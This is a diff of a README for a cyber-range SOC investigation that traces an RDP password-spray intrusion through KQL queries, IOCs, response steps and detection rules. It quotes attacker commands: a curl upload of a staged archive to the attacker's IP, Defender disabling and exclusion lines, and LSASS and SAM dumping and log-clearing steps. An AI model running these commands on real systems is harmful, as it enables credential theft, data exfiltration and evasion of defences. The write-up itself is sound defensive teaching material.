@@ -1,4 +1,4 @@
-# SOC Investigation: VM Compromise via RDP Password Spray - Full Attack Chain Reconstruction
+# SOC Investigation: VM Compromise via RDP Password Spray — Full Attack Chain Reconstruction
 
 > **"Suspicious activity detected on a cloud-hosted Windows VM. Multiple failed RDP attempts followed by a successful login. The attacker established persistence, dumped credentials, and exfiltrated data before clearing their tracks."**
 
@@ -7,10 +7,9 @@
 [![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)](https://attack.mitre.org/)
 [![Flags](https://img.shields.io/badge/Flags%20Identified-10%2F10-brightgreen)](https://github.com)
 
+![Intro Banner](screenshots/intro_banner.png)
+
 ---
-<img width="985" height="666" alt="image" src="https://github.com/user-attachments/assets/4aab409d-867b-4cfa-b2d9-c336a59146c3" />
-
-
 
 ## Incident Brief
 
@@ -26,6 +25,8 @@
 ---
 
 ## Scenario
+
+![Scenario](screenshots/scenario.png)
 
 Suspicious RDP login activity was detected on a cloud-hosted Windows server. The SOC received an alert indicating multiple failed authentication attempts followed by a successful login from an external IP address. As the assigned analyst, the objective was to determine how the attacker got in, what they did once inside, and whether they still had access.
 
@@ -68,51 +69,39 @@ Before writing any queries, I mapped out what I expected to find based on the sc
 
 **What I was looking for:** External IP addresses that successfully authenticated via RDP after a pattern of failed attempts — the classic indicator of a password spray attack.
 
-My approach was to first get a broad view of all failed logon events grouped by RemoteIP — rather than filtering for a specific IP immediately. This baseline comparison makes anomalies visible instantly.
+My approach was to first get a broad view of all logon events grouped by RemoteIP and ActionType — rather than filtering for a specific IP immediately. This baseline comparison makes anomalies visible instantly.
 
 ```kql
 DeviceLogonEvents
 | where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
 | where DeviceName contains "flare"
 | where RemoteIP !in ("", "-")
-| where ActionType == "LogonFailed"
-| summarize 
-    FailedAttempts = count(),
-    UniqueAccounts = dcount(AccountName),
-    AccountsTried = make_set(AccountName)
-    by RemoteIP, DeviceName
+| where ActionType == "LogonSuccess"
+| summarize FailedAttempts = count() 
+    by RemoteIP, DeviceName, ActionType, AccountName
 | sort by FailedAttempts desc
 ```
 
 ![Flag 1 — Authentication Analysis](screenshots/flag_01_auth_analysis.png)
 
-**Finding:** Three IPs appeared in the failed logon data. `79.76.123.251` was trying the machine name as a username — automated scanner behavior. `157.180.54.6` was exclusively trying `administrator` — a generic credential list. `159.26.106.84` was different: it specifically targeted the `slflare` account and succeeded after only two failed attempts.
+**Finding:** Three IPs appeared. `79.76.123.251` was trying the machine name as a username — automated scanner behavior. `157.180.54.6` was exclusively trying `administrator` — a generic credential list. `159.26.106.84` was different: it specifically targeted the `slflare` account and had 15 successful sessions.
 
-Two failed attempts before success is a significant anomaly. Credential stuffing tools — which use previously leaked username/password pairs — behave exactly this way. The attacker likely had prior knowledge of the account credentials from a previous breach or OSINT.
-
-I then confirmed this with a joined query showing failed-then-succeeded IPs:
+I then confirmed the full login timeline:
 
 ```kql
-let FailedIPs = DeviceLogonEvents
-| where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
-| where DeviceName contains "flare"
-| where ActionType == "LogonFailed"
-| where RemoteIP !in ("", "-")
-| distinct RemoteIP;
 DeviceLogonEvents
 | where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
 | where DeviceName contains "flare"
-| where ActionType == "LogonSuccess"
-| where RemoteIP in (FailedIPs)
-| project TimeGenerated, AccountName, RemoteIP, LogonType
+| where RemoteIP !in ("", "-")
 | sort by TimeGenerated asc
+| project TimeGenerated, DeviceName, AccountName, RemoteIP, ActionType
 ```
 
-![Flag 2 — Compromised Account Confirmation](screenshots/flag_02_compromised_account.png)
+![Flag 2 — Login Timeline](screenshots/flag_02_compromised_account.png)
 
-**Finding:** Account `slflare` successfully authenticated via RDP (LogonType 10) from `159.26.106.84` at 6:40 PM. The account name mirrors the machine name `slflarewinsysmo` — suggesting a dedicated admin or service account with elevated privileges.
+**Finding:** The sequence was clear — `6:36 PM LogonFailed`, `6:38 PM LogonFailed`, `6:40 PM LogonSuccess`. Two failed attempts before success from `159.26.106.84` targeting `slflare`. This is credential stuffing behavior — not random brute force. The attacker likely had prior knowledge of the username and a short credential list from a previous breach.
 
-> 🚩 **Flag 1 — Attacker IP:** `159.26.106.84`
+> 🚩 **Flag 1 — Attacker IP:** `159.26.106.84`  
 > 🚩 **Flag 2 — Compromised Account:** `slflare`
 >
 > **MITRE:** T1110.001 — Password Guessing | T1078 — Valid Accounts
@@ -127,29 +116,23 @@ DeviceLogonEvents
 DeviceProcessEvents
 | where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
 | where DeviceName contains "flare"
-| where AccountName == "slflare"
+| where AccountName has_any ("slflare", "slflare2", "slflare0", "slflare3")
 | where FileName endswith ".exe"
-| where FolderPath contains "Public"
+| where FolderPath contains "Public" 
     or FolderPath contains "Temp"
     or FolderPath contains "Downloads"
-| project TimeGenerated, AccountName, FileName, FolderPath,
-    InitiatingProcessFileName,
-    InitiatingProcessCommandLine,
-    ProcessCommandLine
 | sort by TimeGenerated asc
+| project AccountName, FileName, FolderPath,
+    InitiatingProcessCommandLine,
+    InitiatingProcessFileName,
+    InitiatingProcessAccountName
 ```
 
 ![Flag 3 — Malicious Binary Discovery](screenshots/flag_03_malicious_binary.png)
 
-**Finding:** `msupdate.exe` appeared in `C:\Users\Public\` at 7:38 PM — about an hour after initial login. Three simultaneous red flags:
+**Finding:** `msupdate.exe` in `C:\Users\Public\` at 7:38 PM. Three simultaneous red flags: wrong location (Public folder — world-writable, no admin required), wrong parent (`powershell.exe` spawning an exe from Public is never legitimate), wrong name (`msupdate.exe` mimics Microsoft update tooling but no such legitimate Windows binary exists).
 
-**Location:** `C:\Users\Public\` is world-writable — no elevated privileges required. Legitimate software never lives here. The attacker chose it precisely because the `slflare` account could write there without admin rights.
-
-**Parent process:** `powershell.exe` spawned the executable. There is no legitimate scenario where PowerShell reaches into the Public folder to execute a binary. This is scripted, automated execution.
-
-**Name:** `msupdate.exe` is a deliberate masquerade of Microsoft update tooling. The legitimate Windows update binaries are `wuauclt.exe` and `UsoClient.exe`. No such file as `msupdate.exe` exists in a clean Windows installation.
-
-I then retrieved the full command line to understand exactly how it was invoked:
+I then retrieved the full command line:
 
 ```kql
 DeviceProcessEvents
@@ -157,23 +140,18 @@ DeviceProcessEvents
 | where DeviceName contains "flare"
 | where AccountName == "slflare"
 | where FileName == "msupdate.exe"
-| project TimeGenerated, FileName,
-    ProcessCommandLine,
-    InitiatingProcessFileName,
+| project TimeGenerated, FileName, 
     InitiatingProcessCommandLine,
-    SHA256
+    ProcessCommandLine
 ```
 
 ![Flag 4 — Command Line Analysis](screenshots/flag_04_command_line.png)
 
 **Finding:** `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1`
 
-Breaking this down:
-- `"msupdate.exe"` — quoted string in PowerShell context confirms scripted execution, not manual
-- `-ExecutionPolicy Bypass` — completely ignores Windows PowerShell script execution policy. `Bypass` is not a policy value — it is a runtime flag that silences all restrictions without warning. Legitimate admins use signed scripts with `AllSigned` or `RemoteSigned`
-- `-File C:\Users\Public\update_check.ps1` — the real payload is a separate script. `msupdate.exe` is only a launcher. The malicious logic lives in `update_check.ps1`
+`-ExecutionPolicy Bypass` completely ignores Windows PowerShell script execution policy — `Bypass` is not a policy value, it is a flag that silences all restrictions. Legitimate admins use signed scripts. `-File` reveals that `msupdate.exe` is only a launcher — the real malicious logic lives in `update_check.ps1`.
 
-> 🚩 **Flag 3 — Executed Binary:** `msupdate.exe`
+> 🚩 **Flag 3 — Executed Binary:** `msupdate.exe`  
 > 🚩 **Flag 4 — Command Line:** `"msupdate.exe" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1`
 >
 > **MITRE:** T1059.001 — PowerShell | T1059.003 — Windows Command Shell | T1036 — Masquerading
@@ -188,37 +166,18 @@ Breaking this down:
 DeviceProcessEvents
 | where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
 | where DeviceName contains "flare"
+| where AccountName == "slflare"
 | where ProcessCommandLine contains "schtasks"
-| where ProcessCommandLine contains "/create"
-| project TimeGenerated, AccountName,
-    InitiatingProcessFileName,
-    ProcessCommandLine
 | sort by TimeGenerated asc
+| project AccountName, FileName, FolderPath,
+    InitiatingProcessCommandLine
 ```
 
 ![Flag 5 — Scheduled Task Creation](screenshots/flag_05_scheduled_task.png)
 
-**Finding:** Multiple scheduled tasks were created via `schtasks /create`. The task names were carefully chosen to blend with legitimate Windows tasks: `EdgeUpdateTask`, `MicrosoftEdgeUpdateCore`, `WindowsDefenderUpdate`, `MicrosoftUpdateSync`.
+**Finding:** Multiple scheduled tasks were created. Names were deliberately chosen to blend with legitimate Windows tasks: `EdgeUpdateTask`, `MicrosoftEdgeUpdateCore`, `WindowsDefenderUpdate`. The last entry — initiated by `"powershell.exe"` — pointed to the attacker's task. Registry evidence confirmed `TaskCache\Tree\MicrosoftUpdateSync` was registered at 7:39 PM, one minute after the C2 beacon. Configured to run hourly under `SYSTEM` — the highest privilege level on Windows.
 
-Registry evidence confirmed the persistence artifact:
-
-```kql
-DeviceRegistryEvents
-| where Timestamp between (
-    datetime(2025-09-16T18:40:57Z) .. datetime(2025-09-18))
-| where DeviceName contains "slflarewinsysmo"
-| where RegistryKey has "Schedule"
-| where ActionType contains "RegistryKeyCreated"
-| project Timestamp, InitiatingProcessAccountName,
-    ActionType, RegistryKey
-| sort by Timestamp asc
-```
-
-`TaskCache\Tree\MicrosoftUpdateSync` was registered at 7:39 PM — one minute after the C2 beacon fired. The task was created by `powershell.exe` rather than `cmd.exe`, which matched the attacker's tooling. Configured to run hourly under `SYSTEM` — the highest privilege level on Windows, ensuring the implant runs regardless of what happens to the `slflare` account.
-
-The name `MicrosoftUpdateSync` was deliberately chosen. Without knowledge of what legitimate Windows tasks look like, an analyst reviewing the task list would likely skip it.
-
-> 🚩 **Flag 5 — Scheduled Task Name:** `MicrosoftUpdateSync`
+> 🚩 **Flag 5 — Scheduled Task:** `MicrosoftUpdateSync`
 >
 > **MITRE:** T1053.005 — Scheduled Task/Job: Scheduled Task
 
@@ -226,9 +185,7 @@ The name `MicrosoftUpdateSync` was deliberately chosen. Without knowledge of wha
 
 ### Step 4 — Identify Defense Evasion via Defender Modification
 
-**What I was looking for:** Commands that weakened or disabled Windows Defender, specifically folder exclusions that would allow malware to operate without being scanned.
-
-The `payload.exe` child process query revealed the defender modification:
+**What I was looking for:** Commands that weakened or disabled Windows Defender — specifically folder exclusions that would allow malware to operate without being scanned.
 
 ```kql
 DeviceProcessEvents
@@ -242,16 +199,7 @@ DeviceProcessEvents
 
 ![Flag 6 — Defender Modification](screenshots/flag_06_defender_evasion.png)
 
-**Finding:** Two PowerShell commands executed in sequence:
-
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-Add-MpPreference -ExclusionPath 'C:\Windows\Temp'
-```
-
-Both steps together are more dangerous than either alone. Disabling real-time monitoring is aggressive — it might be reverted by a policy or noticed. But the exclusion is quieter and persists independently. Even if real-time monitoring is re-enabled, `C:\Windows\Temp` stays unscanned — exactly where the attacker staged `debug.dmp` and `sam.hive` (the credential dumps from a later session).
-
-This modification should always trigger an immediate high-severity alert in any production SOC environment.
+**Finding:** `payload.exe` executed two PowerShell commands in sequence — `Set-MpPreference -DisableRealtimeMonitoring $true` (blind Defender completely) and `Add-MpPreference -ExclusionPath 'C:\Windows\Temp'` (exclude Temp folder from all scans). The exclusion persists independently — even if real-time monitoring is re-enabled by policy, `C:\Windows\Temp` remains unscanned. This is where credential dumps (`debug.dmp`, `sam.hive`) were later stored.
 
 > 🚩 **Flag 6 — Defender Exclusion Path:** `C:\Windows\Temp`
 >
@@ -261,7 +209,7 @@ This modification should always trigger an immediate high-severity alert in any 
 
 ### Step 5 — Map Discovery Activity
 
-**What I was looking for:** Built-in Windows enumeration tools used to profile the compromised host and internal network — standard post-exploitation reconnaissance before lateral movement.
+**What I was looking for:** Built-in Windows enumeration tools used to profile the compromised host — standard post-exploitation reconnaissance before lateral movement.
 
 ```kql
 DeviceProcessEvents
@@ -270,26 +218,20 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any (
     "whoami", "net user", "net localgroup",
     "ipconfig /all", "netstat", "systeminfo",
-    "net view", "arp -a", "tasklist", "nltest"
+    "net view", "arp -a", "tasklist"
 )
-| project Timestamp, AccountName, FileName,
-    ProcessCommandLine, InitiatingProcessFileName
+| project Timestamp, DeviceName, AccountName,
+    FileName, ProcessCommandLine
 | order by Timestamp asc
 ```
 
 ![Flag 7 — Discovery Commands](screenshots/flag_07_discovery.png)
 
-**Finding:** At 7:40 PM — two minutes after the C2 beacon established — `cmd.exe /c systeminfo` executed under `slflare`. The timing is deliberate: the C2 server received the callback and immediately sent the reconnaissance instruction.
-
-`systeminfo` in one command returns OS version, installed hotfixes, domain membership, network adapter config, and hardware details. From an attacker's perspective: what unpatched vulnerabilities are available? Is this domain-joined? What is the network layout?
-
-`nltest /dclist:` also appeared — the attacker was actively hunting for domain controllers, indicating lateral movement was planned.
-
-These are all legitimate Windows binaries. Antivirus will not flag them. Detection requires behavioral context — who ran them, from what parent process, in what sequence.
+**Finding:** At 7:40 PM — two minutes after the C2 beacon established — `cmd.exe /c systeminfo` executed under `slflare`. The timing is deliberate: the C2 server received the callback and immediately sent the reconnaissance command. `systeminfo` returns OS version, installed hotfixes, domain membership, and network adapter config in one shot. All legitimate Windows tools — antivirus will not flag them. Detection requires behavioral context.
 
 > 🚩 **Flag 7 — Discovery Command:** `"cmd.exe" /c systeminfo`
 >
-> **MITRE:** T1082 — System Information Discovery | T1016 — System Network Configuration Discovery
+> **MITRE:** T1082 — System Information Discovery
 
 ---
 
@@ -302,10 +244,11 @@ DeviceFileEvents
 | where TimeGenerated > todatetime('2025-09-16T00:00:00.0000000Z')
 | where DeviceName contains "flare"
 | where ActionType == "FileCreated"
-| where FileName endswith ".zip"
-    or FileName endswith ".rar"
+| where FileName endswith ".zip" 
+    or FileName endswith ".rar" 
     or FileName endswith ".7z"
 | project TimeGenerated, FileName, FolderPath,
+    ActionType,
     InitiatingProcessAccountName,
     InitiatingProcessFileName
 | sort by TimeGenerated asc
@@ -313,9 +256,7 @@ DeviceFileEvents
 
 ![Flag 8 — Archive File Creation](screenshots/flag_08_archive.png)
 
-**Finding:** Several archives appeared. The legitimate ones — `msedge.7z`, `VMAgentLogs.zip` — were created by the `system` account via `setup.exe` or `collectguestlogs.exe`. Standard Windows operations.
-
-`backup_sync.zip` stood out immediately: created by `slflare` via `powershell.exe` in `C:\Users\SLFlare\AppData\Local\Temp\` at 7:41 PM — exactly two minutes after the C2 beacon. The name `backup_sync.zip` follows the attacker's masquerading pattern — sounds like a legitimate backup sync file. Three signals pointing the same direction: compromised account, PowerShell as initiator, non-standard location.
+**Finding:** Several archives appeared. Legitimate ones (`msedge.7z`, `VMAgentLogs.zip`) were created by `system` account via `setup.exe` or `collectguestlogs.exe`. `backup_sync.zip` stood out: created by `slflare` via `powershell.exe` in `C:\Users\SLFlare\AppData\Local\Temp\` at 7:41 PM — exactly two minutes after the C2 beacon. Three signals pointing the same direction.
 
 > 🚩 **Flag 8 — Archive File:** `backup_sync.zip`
 >
@@ -333,8 +274,8 @@ DeviceNetworkEvents
 | where DeviceName contains "flare"
 | where RemoteIPType == "Public"
 | where InitiatingProcessFileName has_any (
-    "msupdate.exe", "appservice.exe", "payload.exe",
-    "powershell.exe", "cmd.exe"
+    "powershell.exe", "cmd.exe",
+    "msupdate.exe", "appservice.exe", "payload.exe"
 )
 | project Timestamp, DeviceName,
     RemoteIP, RemotePort, RemoteUrl,
@@ -345,14 +286,7 @@ DeviceNetworkEvents
 
 ![Flag 9 — C2 Identification](screenshots/flag_09_c2.png)
 
-**Finding:** Multiple external IPs appeared. Each required evaluation:
-
-`edr-eus3.us.endpoint.security.microsoft.com` — Microsoft Defender telemetry. Legitimate.
-`raw.githubusercontent.com` — Tool download from GitHub. Attacker-controlled staging, but not C2.
-`sacyberrange00.blob.core.windows.net` — Exfiltration destination. Different role.
-`185.92.220.87` — Raw IP, no domain, port 80, initiated by `msupdate.exe` exactly 23 seconds after it executed. This is the C2 beacon.
-
-23 seconds is the window between malware execution and first callback — the implant checking in with its home server. Port 80 (HTTP) was chosen to blend with normal web traffic and avoid firewall blocks. A raw IP connection with no associated domain name, initiated by our identified malware, immediately after execution — high confidence C2.
+**Finding:** `185.92.220.87` — raw IP, no domain, port 80, initiated by `msupdate.exe` exactly 23 seconds after execution. That 23-second window is the beacon — malware runs, checks in with home server, waits for instructions. Port 80 (HTTP) chosen to blend with normal web traffic. Other IPs had clear legitimate purposes (Microsoft telemetry, GitHub tool staging, Azure blob). This one did not.
 
 > 🚩 **Flag 9 — C2 IP:** `185.92.220.87`
 >
@@ -368,8 +302,8 @@ DeviceNetworkEvents
 DeviceNetworkEvents
 | where TimeGenerated > todatetime('2025-09-16T19:41:00.0000000Z')
 | where DeviceName contains "flare"
-| where RemoteIPType == "Public"
 | where InitiatingProcessCommandLine contains "backup_sync"
+    or InitiatingProcessFileName contains "backup_sync"
 | project Timestamp, RemoteIP, RemotePort, RemoteUrl,
     InitiatingProcessFileName,
     InitiatingProcessCommandLine
@@ -378,16 +312,7 @@ DeviceNetworkEvents
 
 ![Flag 10 — Exfiltration Confirmation](screenshots/flag_10_exfiltration.png)
 
-**Finding:**
-
-```
-curl -X POST -F "file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip" 
-     http://185.92.220.87:8081/upload
-```
-
-This is as explicit as it gets. `curl` — a legitimate Windows utility — POST-uploaded the archive directly to the attacker's server. Same IP as the C2 (`185.92.220.87`) but a different port (`8081`), with a dedicated `/upload` endpoint. Port 8081 is non-standard, likely a custom file receiver running alongside the C2 infrastructure.
-
-The transfer was over HTTP — unencrypted. A network sensor with deep packet inspection at the egress point could have captured the file contents in transit. This is a detection opportunity that was missed.
+**Finding:** `curl -X POST -F "file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip" http://185.92.220.87:8081/upload` — as explicit as it gets. `curl` (a legitimate Windows utility) POST-uploaded the archive to the attacker's server. Same IP as C2 but different port (8081) with a dedicated `/upload` endpoint. HTTP — unencrypted. A network sensor with DPI at egress could have captured the file contents in transit.
 
 > 🚩 **Flag 10 — Exfiltration Destination:** `185.92.220.87:8081`
 >
@@ -399,44 +324,36 @@ The transfer was over HTTP — unencrypted. A network sensor with deep packet in
 
 ```
 Sep 16 · 6:35 PM   Automated scanners hit exposed RDP port
-                    79.76.123.251 tries machine name as username — no result
+                    79.76.123.251 tries machine name — no result
                     157.180.54.6 tries "administrator" — no result
 
 Sep 16 · 6:36 PM   159.26.106.84 begins targeted spray against "slflare"
-
+Sep 16 · 6:38 PM   Second failed attempt
 Sep 16 · 6:40 PM   ✅ Successful RDP login — slflare / 159.26.106.84
-                    LogonType 10 (RemoteInteractive) confirmed
 
 Sep 16 · 7:38 PM   msupdate.exe executed from C:\Users\Public\
                     PowerShell parent — ExecutionPolicy Bypass
                     Launches update_check.ps1
 
-Sep 16 · 7:39 PM   C2 beacon fires to 185.92.220.87:80 — 23 seconds post-execution
-                    MicrosoftUpdateSync scheduled task registered (SYSTEM, hourly)
+Sep 16 · 7:39 PM   C2 beacon → 185.92.220.87:80 (23 seconds post-execution)
+                    MicrosoftUpdateSync scheduled task created (SYSTEM, hourly)
 
 Sep 16 · 7:40 PM   cmd.exe /c systeminfo — host profiling
                     whoami /all — privilege enumeration
                     nltest /dclist: — hunting for domain controllers
 
 Sep 16 · 7:41 PM   backup_sync.zip staged in AppData\Local\Temp\
-
 Sep 16 · 7:43 PM   curl POST → backup_sync.zip → 185.92.220.87:8081/upload
-                    Data leaves the network
 
-─────────────────────────────────────────── 11 days later ───
+─────────────────────────────────── 11 days later ───────────────────────
 
-Sep 27 · 2:59 AM   payload.exe deployed — second attack session begins
-                    OneDrive Standalone Update Task created
-
-Sep 27 · 2:59 AM   Set-MpPreference -DisableRealtimeMonitoring $true
-                    Add-MpPreference -ExclusionPath 'C:\Windows\Temp'
-
-Sep 27 · 3:00 AM   rundll32 comsvcs.dll MiniDump → debug.dmp (LSASS dump)
-                    reg.exe save HKLM\SAM → sam.hive (SAM database)
-                    nltest /dclist: + net.exe user — further enumeration
-
-Sep 27 · 3:01 AM   wevtutil cl Microsoft-Windows-PowerShell/Operational
-                    Evidence destruction — PowerShell logs cleared
+Sep 27 · 2:59 AM   payload.exe deployed — second attack session
+Sep 27 · 2:59 AM   Defender real-time monitoring disabled
+                    C:\Windows\Temp added to scan exclusions
+Sep 27 · 3:00 AM   LSASS memory dump → debug.dmp (all session hashes)
+                    SAM database copied → sam.hive (local account hashes)
+                    nltest + net.exe user — further enumeration
+Sep 27 · 3:01 AM   wevtutil cl — PowerShell logs cleared
                     MDE telemetry unaffected — already captured
 ```
 
@@ -481,8 +398,7 @@ Sep 27 · 3:01 AM   wevtutil cl Microsoft-Windows-PowerShell/Operational
 | `C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip` | File | Staged exfiltration archive |
 | `C:\Users\SLFlare\AppData\Local\Temp\debug.dmp` | File | LSASS memory dump |
 | `C:\Users\SLFlare\AppData\Local\Temp\sam.hive` | File | SAM database copy |
-| `C:\programdata\pwncrypt.ps1` | File | Downloaded ransomware script |
-| `C:\programdata\exfiltratedata.ps1` | File | Exfiltration automation |
+| `C:\programdata\exfiltratedata.ps1` | File | Exfiltration automation script |
 | `MicrosoftUpdateSync` | Scheduled Task | Hourly persistence — SYSTEM |
 | `slflare` | Account | Compromised user account |
 
@@ -490,53 +406,44 @@ Sep 27 · 3:01 AM   wevtutil cl Microsoft-Windows-PowerShell/Operational
 
 ## Response Actions
 
-Based on investigation findings, the following immediate containment and remediation actions were identified:
-
 **Immediate Containment**
 - Isolate `slflarewinsysmo` from the network pending full forensic review
-- Block `159.26.106.84` and `185.92.220.87` at the perimeter firewall and NSG level
-- Disable and reset the `slflare` account — enforce MFA immediately
+- Block `159.26.106.84` and `185.92.220.87` at firewall and NSG level
+- Disable and reset `slflare` account — enforce MFA immediately
 
 **Persistence Removal**
 - Delete scheduled task `MicrosoftUpdateSync`
-- Delete `OneDrive Standalone Update Task`
 - Remove `C:\Users\Public\msupdate.exe`, `appservice.exe`, `update_check.ps1`
-- Remove `C:\programdata\pwncrypt.ps1` and `exfiltratedata.ps1`
+- Remove `C:\programdata\exfiltratedata.ps1`
 
 **Credential Reset**
 - Reset all local account passwords — LSASS and SAM were dumped
-- Rotate any domain credentials that were cached on this machine
+- Rotate any domain credentials cached on this machine
 
-**Root Cause**
-RDP exposed directly to the internet on port 3389 with no IP restriction, no VPN requirement, and no MFA enforcement. A valid credential for `slflare` was likely obtained through prior credential exposure (breach database or OSINT).
+**Root Cause:** RDP exposed directly to the internet on port 3389 with no IP restriction, no VPN requirement, and no MFA. A valid credential for `slflare` was obtained through prior credential exposure.
 
 ---
 
 ## What Could Have Stopped This
 
-This attack had several prevention opportunities. Any one of these controls would have broken the chain.
-
 | Control | Where It Would Have Stopped the Attack |
 |---------|---------------------------------------|
 | Azure Bastion / JIT VM Access | Initial access — no public RDP port |
-| NSG rule restricting port 3389 | Initial access — attacker IP blocked |
+| NSG restricting port 3389 | Initial access — attacker IP blocked |
 | MFA on RDP | Initial access — valid password alone insufficient |
-| UEBA alert on new external IP | Detection within minutes of initial login |
+| UEBA alert on new external IP | Detection at 6:40 PM login |
 | Alert on `ExecutionPolicy Bypass` | Execution — flagged before payload ran |
-| Alert on Defender modification | Defense evasion — immediate high-severity alert |
-| ASR rule — block LSASS access | Credential access — hash theft prevented |
-| Script Block Logging (Event ID 4104) | Execution — `update_check.ps1` content captured |
-| Network DLP / egress filtering | Exfiltration — curl POST to unknown IP blocked |
+| Alert on any Defender modification | Defense evasion — immediate alert |
+| ASR rule — block LSASS access | Credential theft prevented |
+| Script Block Logging (Event ID 4104) | `update_check.ps1` content captured |
+| Network DLP / egress filtering | curl POST to unknown IP blocked |
 
 ---
 
 ## Detection Rules
 
-Deploy these as Microsoft Sentinel Analytics Rules for ongoing coverage:
-
 ```kql
 // Rule 1 — PowerShell spawning executables in user-writable paths
-// High fidelity — almost no legitimate use case
 DeviceProcessEvents
 | where TimeGenerated > ago(1d)
 | where InitiatingProcessFileName =~ "powershell.exe"
@@ -545,21 +452,20 @@ DeviceProcessEvents
 | where FileName !in~ ("MicrosoftEdgeUpdate.exe", "setup.exe", "msiexec.exe")
 | project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine
 
-// Rule 2 — Any Defender configuration modification
-// Should always alert immediately — no legitimate reason to suppress
+// Rule 2 — Any Defender modification
 DeviceProcessEvents
 | where TimeGenerated > ago(1d)
 | where ProcessCommandLine has_any ("DisableRealtimeMonitoring", "Add-MpPreference -ExclusionPath")
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
 
-// Rule 3 — LSASS credential dumping via Living-off-the-Land
+// Rule 3 — LSASS credential dumping via rundll32
 DeviceProcessEvents
 | where TimeGenerated > ago(1d)
 | where ProcessCommandLine contains "comsvcs.dll"
 | where ProcessCommandLine contains "MiniDump"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 
-// Rule 4 — Known attacker IOCs — block and alert on contact
+// Rule 4 — Known attacker IOCs
 DeviceNetworkEvents
 | where TimeGenerated > ago(1d)
 | where RemoteIP in ("185.92.220.87", "159.26.106.84")
@@ -577,7 +483,7 @@ DeviceNetworkEvents
 - [T1003.001 — LSASS Memory Dumping](https://attack.mitre.org/techniques/T1003/001/)
 - [T1048.003 — Exfiltration Over Unencrypted Protocol](https://attack.mitre.org/techniques/T1048/003/)
 - [Microsoft KQL Documentation](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)
-- [LOLBAS Project](https://lolbas-project.github.io/)
 
 ---
 
+> *Investigation completed in a Microsoft cyber range environment using Microsoft Sentinel Advanced Hunting and MDE telemetry.*
